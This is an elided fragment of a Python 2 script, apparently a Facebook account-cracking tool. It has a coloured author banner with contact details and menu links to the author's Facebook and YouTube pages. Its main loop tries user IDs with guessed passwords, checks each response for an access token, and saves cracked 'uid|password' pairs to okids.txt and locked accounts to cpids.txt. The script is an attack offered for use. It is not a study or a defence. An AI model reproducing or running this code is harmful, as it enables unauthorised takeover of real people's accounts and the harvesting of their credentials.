...
#Script Edited By MUHAMMAD HAMZA
#Utf-8 python 
...
\n\033[1;90m[*]============================================
\033[1;92mAuthor \033[1;93m: MUHAMMAD HAMZA
\033[1;92mFb \033[1;93m: IT'Z HECTOR
\033[1;92mDisclaimer \033[1;93m: ALHAMDULIAH FOR EVERYTHING
\033[1;92mContact = +923177505921
\033[1;90m[*]============================================
\033[1;93m  IF NO RESLUT USE AIRPLANE MOOD FOR 10 SECOND
...
def main():
    ...
    print ' \033[0m[3].\x1b[1;96m NEW CHANNEL MUST SUBSCRIBE '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/itzhector786 ')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/channel/UCXzNBW6pv2uNS8G5QE-Qmjg')
        main()
    else:
        print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[HECTOR-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[HECTOR-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
